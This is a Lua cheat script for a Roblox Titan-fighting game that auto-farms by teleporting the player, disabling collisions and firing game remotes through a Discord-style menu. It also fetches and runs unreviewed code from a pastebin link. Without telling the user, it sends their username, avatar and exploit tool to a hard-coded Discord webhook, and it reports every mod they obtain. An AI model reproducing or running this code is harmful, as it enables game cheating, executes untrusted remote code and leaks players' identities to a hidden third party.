repeat wait() until game:IsLoaded() and game.Players and game.Players.LocalPlayer and game.Players.LocalPlayer.Character
local player = game.Players.LocalPlayer
local char = player.Character or player.CharacterAdded:Wait()
local hrp = char:WaitForChild("HumanoidRootPart")
local torso = char:WaitForChild("Torso")
local hum = char:WaitForChild("Humanoid")
local runService = game:GetService("RunService")
local virtualUser = game:GetService("VirtualUser")
local reloading = false
local mouse = player:GetMouse()
local DiscordLib = loadstring(game:HttpGet"https://raw.githubusercontent.com/dawid-scripts/UI-Libs/main/discord%20lib.txt")()
pcall(function()
    loadstring(game:HttpGet(('https://pastebin.com/raw/JMeYGA8c'),true))()
  end)
  spawn(function()
    game:GetService("RunService").RenderStepped:Connect(function()
      local plr = game.Players.LocalPlayer
      for i ,v in pairs(game.Players:GetPlayers()) do
       if i > 1 then
         plr:Kick(v.Name.." are the players")
       end
      end
    end)
  end)
   
  local properties = {
      autoFarm = false,
      autoPrestige = false,
      Fixinjury = false,
      returnToLobby = false,
      leaveHealth = false,
  }
   
   
  local webhookcheck =
  is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
  secure_load and "Sentinel" or
  KRNL_LOADED and "Krnl" or
  SONA_LOADED and "Sona" or
  "Kid with shit exploit"
   
  function weebhook1()
    local url = "https://discord.com/api/webhooks/900305183542747176/WQRW6yhtqbsPVIRsAkVOo8Q8Bt9DyzLKshF7gReBL70B4dYeTd2S8yu15q-PtswSCCf9"
   
  local data = {
     ["content"] = "ez",
     ["embeds"] = {
         {
             ["title"] = "**Someone Executed Your Script!**",
             ["description"] = "Username: " .. game.Players.LocalPlayer.Name.." with **"..webhookcheck.."**",
             ["type"] = "rich",
             ["color"] = tonumber(0x7269da),
             ["image"] = {
                 ["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" ..
                     tostring(game:GetService("Players").LocalPlayer.Name)
             }
         }
     }
  }
  local newdata = game:GetService("HttpService"):JSONEncode(data)
   
  local headers = {
     ["content-type"] = "application/json"
  }
  request = http_request or request or HttpPost or syn.request
  local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
  request(abcdef)
  end
  function weebhook2(Mod)
   
    local url = "https://discord.com/api/webhooks/900305183542747176/WQRW6yhtqbsPVIRsAkVOo8Q8Bt9DyzLKshF7gReBL70B4dYeTd2S8yu15q-PtswSCCf9"
   
    local data = {
       ["content"] = "مود في الجيب",
       ["embeds"] = {
           {
               ["title"] = "Mod: ".."**"..Mod.Name.."**",
               ["description"] = "Username: " .. game.Players.LocalPlayer.Name.." with **"..webhookcheck.."**",
               ["type"] = "rich",
               ["color"] = tonumber(0x7269da),
               ["image"] = {
                   ["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" ..
                       tostring(game:GetService("Players").LocalPlayer.Name)
               }
           }
       }
    }
    local newdata = game:GetService("HttpService"):JSONEncode(data)
   
    local headers = {
       ["content-type"] = "application/json"
    }
    request = http_request or request or HttpPost or syn.request
    local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
    request(abcdef)
   
  end
   
   
  weebhook1()
  if game.PlaceId == 7176980618 then
   
   
  spawn(function()
      for i = 0,4 do wait()
          while true do wait()
            local plr = game.Players.LocalPlayer
   
         local char = plr.Character or plr.CharacterAdded:Wait()
         local hrp = char:WaitForChild("HumanoidRootPart")
         hrp.CFrame = CFrame.new(-3.13314342, 5.80744743, 193.96347, 0.00889319554, -4.77962168e-08, 0.999960482, -3.16071684e-08, 1, 4.80792082e-08, -0.999960482, -3.20334976e-08, 0.00889319554)
          end
      end
  end)
   
   
  else
   
  local keyTable = {
      pressKey = true,
      pressKey2 = true,
  }
   

  local virtualUser = game:GetService('VirtualUser')

  local Target
  local toggled = false
  local first = true
  local reloading = false
   
  local plr = game.Players.LocalPlayer
    plr.Data.Mods.ChildAdded:Connect(function(child)
     weebhook2(child)
    end)

  local plr = game.Players.LocalPlayer
  function fastautofarm()
   
    local plr = game.Players.LocalPlayer
    local char = plr.Character or plr.CharacterAdded:Wait()
   
    local hrp = char:WaitForChild("HumanoidRootPart")
   
    if char.Humanoid.Health <= 0 then
        game:GetService("ReplicatedStorage").Remotes.ReturnToLobby:FireServer()
    end
   
    local titans = game.Workspace.Titans:GetDescendants()
   
    if plr.PlayerGui.Main.MissionCompleted.Visible == true then
        wait(.75)
      if  properties.hardMode == false then
        game:GetService("ReplicatedStorage").Remotes.ReturnToLobby:FireServer()
   
      end
    end
    if plr.Character:FindFirstChild("RightBlade") then
      wait()
      toggled = false
    else
   
      toggled = true
      game:GetService("ReplicatedStorage").Remotes.ODM:FireServer({"ToggleBlades"})
      hrp.CFrame = CFrame.new(0,50,0)
      wait(.75)
    end
   
   
    for i = 1, #titans do
   
      if titans[i].Name == "Nape"  then
   
          if plr.Data.BladesLeft.Value <= 0 and plr.Data.BladeDurability.Value > 0 then
              spawn(function()
              if keyTable.pressKey2 == true then
              keyTable.pressKey2 = false
              spawn(function()
                  wait(.35)
                  keyTable.pressKey2 = true
              end)
   
              -- refill    
   
          end
        end)
   
          end
          if plr.Data.BladeDurability.Value == 0 and plr.Data.BladesLeft.Value > 0 then
            spawn(function()
              if keyTable.pressKey == true then
                  keyTable.pressKey = false
                  spawn(function()
                      wait(.35)
                      keyTable.pressKey = true
                  end)
              -- reload 
                  game:GetService("ReplicatedStorage").Remotes.ODM:FireServer({"ReloadBlades"})
   
              end 
            end)                    
           end
   
           if plr.Data.BladeDurability.Value > 0 and plr.Data.BladesLeft.Value > 0 then
   
              for i,v in pairs(titans[i].Parent.Parent:GetChildren()) do
                  if v:IsA("BasePart") then
                      v.CanCollide = false
                  end
              end
   
   
             game:GetService("ReplicatedStorage").Remotes.ODM:FireServer({"StartSwing"})
             game:GetService("ReplicatedStorage").Remotes.ODM:FireServer({"EndSwing"})
   
   
              Target = titans[1]
   
         if Target:FindFirstChild("Hitboxes") then
   
          if not Target.Hitboxes:FindFirstChild("Nape") then
   
            table.remove(titans, 1)
        else
   
   
          local plr = game.Players.LocalPlayer
          if Target:FindFirstChild("Hitboxes")  then
   
            game:GetService("RunService").RenderStepped:Wait()
            local ts = game:GetService("TweenService")
        
            if not Target:FindFirstChild("TPPart") then
              local part = Instance.new("Part")
              part.Parent = Target
              part.Name = "TPPart"
              part.Transparency = 1
              part.Anchored = false
              part.CanCollide = false
              part.CFrame = Target.Hitboxes:WaitForChild("Nape").CFrame * CFrame.new(0,-2,2)
              part.Size = Vector3.new(25,5,25)

              
              local weld = Instance.new("WeldConstraint")
              weld.Parent = part
              weld.Part0 = part
              weld.Part1 = Target.Hitboxes:WaitForChild("Nape")

              local at = Instance.new("Attachment")
              at.Parent = part
              at.Name = "ATR"

              hrp.CFrame = part.CFrame
            end
          if Target:FindFirstChild("TPPart") and not reloading then
            local part = Target:FindFirstChild("TPPart")
            local at = part:FindFirstChild("ATR")
            
            if not hrp:FindFirstChild("HRPAlign") then
              local alignPosition = Instance.new("AlignPosition")
              alignPosition.Parent = hrp
              alignPosition.Attachment0 = hrp:FindFirstChild("RootAttachment")
              alignPosition.Attachment1 = at
              alignPosition.Name = "HRPAlign"
              alignPosition.Responsiveness = 200
              alignPosition.MaxForce = Vector3.new(math.huge,math.huge,math.huge)
              
              local AlignOrientation = Instance.new("AlignOrientation")
              AlignOrientation.Parent = hrp
              AlignOrientation.Attachment0 = hrp:FindFirstChild("RootAttachment")
              AlignOrientation.Attachment1 = at
              AlignOrientation.Name = "HRPAlign2"
              AlignOrientation.RigidityEnabled = true

              hrp.CFrame = part.CFrame
              local hum = char:WaitForChild("Humanoid")
              hum:MoveTo(Target.Hitboxes:WaitForChild("Nape").Position)
            else
            
              local alignPosition = hrp:FindFirstChild("HRPAlign")
              alignPosition.Attachment0 =hrp:FindFirstChild("RootAttachment")
              alignPosition.Attachment1 = at
              alignPosition.RigidityEnabled = true

              local AlignOrientation = hrp:FindFirstChild("HRPAlign2")
              AlignOrientation.Attachment0 =hrp:FindFirstChild("RootAttachment")
              AlignOrientation.Attachment1 = at
              AlignOrientation.RigidityEnabled = true
              end
          end
    
          end
   
        end
         end
   
        elseif player.Data.BladeDurability.Value >= 0 and player.Data.BladesLeft.Value <= 0 then
   
   
              local blades =game.Workspace.SupplyStations:GetDescendants()
            for i = 1, #blades do
              if blades[i].Name == "BladesLeft" then
                  if blades[i].Value > 0 then
   
                    reloading = true
                        blades[i].Parent.RemoteEvent:FireServer(true)
                        hrp.CFrame = blades[i].Parent.CFrame
                        for i,v in pairs(player.Character:GetDescendants()) do

                          if v.Name == "HRPAlign" then
                            v:Destroy()
                          end
                        end
                        for i,v in pairs(player.Character:GetDescendants()) do

                          if v.Name == "HRPAlign2" then
                            v:Destroy()
                          end
                        end
                        for i,v in pairs(workspace.Titans:GetDescendants()) do
                          if v.Name == "TPPart" then
                            v:Destroy()
                          end
                        end
                     wait(.85)
                     reloading = false
                     break
   
                  end
              end
             end
   
   
   
   
           end
   
   
   
      end
  end
   
  end
  function autoFarm()
      spawn(function()
        while true do wait()
   
            if properties.autoFarm == true then
   
              if plr:FindFirstChild("PlayerGui"):FindFirstChild("ScreenPan") then
   
              if plr.PlayerGui.ScreenPan.SkipPan.Visible == false  then
                fastautofarm()
              else
                local blades =game.Workspace.SupplyStations:GetDescendants()
                for i = 1, #blades do
                  if blades[i].Name == "BladesLeft" then
   
                            hrp.CFrame = blades[i].Parent.CFrame
                            for i,v in pairs(player.Character:GetDescendants()) do

                              if v.Name == "HRPAlign" then
                                v:Destroy()
                              end
                            end
                            for i,v in pairs(player.Character:GetDescendants()) do

                              if v.Name == "HRPAlign2" then
                                v:Destroy()
                              end
                            end
                            for i,v in pairs(workspace.Titans:GetDescendants()) do
                              if v.Name == "TPPart" then
                                v:Destroy()
                              end
                            end
                        reloading = true
                         wait(.85)
                         reloading = false
                         break
   
   
                  end
                 end
   
                end
              end
            else
              break
            end
   
   
        end
      end)
  end

  local valid3 = isfile("TitansFarm.txt")
   
  if valid3 then
      properties.autoFarm = true
     
      autoFarm()
   end
 
   local win = DiscordLib:Window("Mos Lord Hub")
   
  local TitansPage = win:Server("Titans", " ")
  local TitansFarm = TitansPage:Channel("Auto Farm")  
   
  if valid3 then
   
    local TitansFarmToggle = TitansFarm:Toggle("Auto Farm", true, function(Value)
      if Value then
            properties.autoFarm = true
            
            writefile("TitansFarm.txt", "")

          
            autoFarm()
            print("Auto Farm on")
            
        else
          for i,v in pairs(player.Character:GetDescendants()) do

            if v.Name == "HRPAlign" then
              v:Destroy()
            end
          end
          for i,v in pairs(player.Character:GetDescendants()) do

            if v.Name == "HRPAlign2" then
              v:Destroy()
            end
          end
          for i,v in pairs(workspace.Titans:GetDescendants()) do
            if v.Name == "TPPart" then
              v:Destroy()
            end
          end
          delfile("TitansFarm.txt")
    
            properties.autoFarm = false
            print("Auto Farm off")
       end
  end)
   
  else
   
  local TitansFarmToggle = TitansFarm:Toggle("Auto Farm", false, function(Value)
    if Value then
          properties.autoFarm = true
   
          writefile("TitansFarm.txt", "Titan Farm On")
       
          autoFarm()
          print("Auto Farm on")
      else
   
        delfile("TitansFarm.txt")

          properties.autoFarm = false
          print("Auto Farm off")
     end
  end)
  end
   
   
  local LeaveSavesyourdata = TitansFarm:Button("Leave, Saves your Data", function(Value)
   
   
  game:GetService("ReplicatedStorage").Remotes.ReturnToLobby:FireServer()
   
  end)
   
   
  local hardmodevalid = isfile("HardMode.txt")
   
  if hardmodevalid then
   
    local HardModeToggle = TitansFarm:Toggle("Hard Mode (Stays in mission)", true, function(Value)
      if Value then
            properties.returnToLobby = false
          properties.hardMode = true
            writefile("HardMode.txt", "Hard Mode On")
        
   
            print("Hard Mode on")
        else
   
          delfile("HardMode.txt")
          properties.hardMode = false
            properties.returnToLobby = true
            print("Hard Mode off")
       end
  end)
   
   
  else
    local HardModeToggle = TitansFarm:Toggle("Hard Mode (Stays in mission)", false, function(Value)
      if Value then
            properties.returnToLobby = false
            properties.hardMode = true
            writefile("HardMode.txt", "Hard Mode On")
    
            print("Hard Mode on")
        else
   
          delfile("HardMode.txt")
          properties.hardMode = false
            properties.returnToLobby = true
            print("Hard Mode off")
       end
  end)
  end
   
   
  local leavehealthvalid = isfile("LeaveHealth.txt")
   
  if leavehealthvalid then

   
      properties.leaveHealth = true
   
      spawn(function()
      while true do wait()
        if properties.leaveHealth == true then
   
          if plr:FindFirstChild("PlayerGui"):FindFirstChild("Main") then
            local gui = plr.PlayerGui.Main.Mission.Sort
   
            if gui:FindFirstChild("TitanHP") then
              game:GetService("ReplicatedStorage").Remotes.ReturnToLobby:FireServer()
            end
            if gui:FindFirstChild("CastleHP") then
              game:GetService("ReplicatedStorage").Remotes.ReturnToLobby:FireServer()
            end
          end
   
        else
          break
        end
      end
    end)
    local LeaveHealthToggle = TitansFarm:Toggle("Leave On health missions", true, function(Value)
      if Value then
            properties.leaveHealth = true
            writefile("LeaveHealth.txt", "..")
   
            spawn(function()
            while true do wait()
              if properties.leaveHealth == true then
   
                if plr:FindFirstChild("PlayerGui"):FindFirstChild("Main") then
                  local gui = plr.PlayerGui.Main.Mission.Sort
   
                  if gui:FindFirstChild("TitanHP") then
                    game:GetService("ReplicatedStorage").Remotes.ReturnToLobby:FireServer()
                  end
                  if gui:FindFirstChild("CastleHP") then
                    game:GetService("ReplicatedStorage").Remotes.ReturnToLobby:FireServer()
                  end
                end
   
              else
                break
              end
            end
          end)
            print("LeaveHealth on")
        else
   
          delfile("LeaveHealth.txt")
      properties.leaveHealth = false
            print("LeaveHealth off")
       end
   
  end)
   
  else
    local LeaveHealthToggle = TitansFarm:Toggle("Leave On health missions", false, function(Value)
      if Value then
            properties.leaveHealth = true
   
            writefile("LeaveHealth.txt", "..")
       
            spawn(function()
            while true do wait()
              if properties.leaveHealth == true then
   
                if plr:FindFirstChild("PlayerGui"):FindFirstChild("Main") then
                  local gui = plr.PlayerGui.Main.Mission.Sort
   
                  if gui:FindFirstChild("TitanHP") then
                    game:GetService("ReplicatedStorage").Remotes.ReturnToLobby:FireServer()
                  end
                  if gui:FindFirstChild("CastleHP") then
                    game:GetService("ReplicatedStorage").Remotes.ReturnToLobby:FireServer()
                  end
                end
   
              else
                break
              end
            end
          end)
   
            print("LeaveHealth on")
        else
   
          delfile("LeaveHealth.txt")
   properties.leaveHealth = false
            print("LeaveHealth off")
       end
   
  end)
   end
end
